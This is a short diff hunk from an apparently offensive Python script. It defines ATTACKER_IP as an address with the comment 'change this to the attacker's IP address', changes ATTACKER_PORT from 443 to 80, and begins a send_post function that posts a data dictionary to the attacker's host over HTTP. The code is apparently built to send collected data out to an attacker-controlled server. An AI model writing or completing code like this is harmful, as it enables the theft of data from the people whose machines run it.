@@ -6,7 +6,7 @@ import time
 import os
 
 ATTACKER_IP = '88.99.28.233' # change this to the attacker's IP address
-ATTACKER_PORT = 443
+ATTACKER_PORT = 80
 
 # Data is a dict
 def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}'):
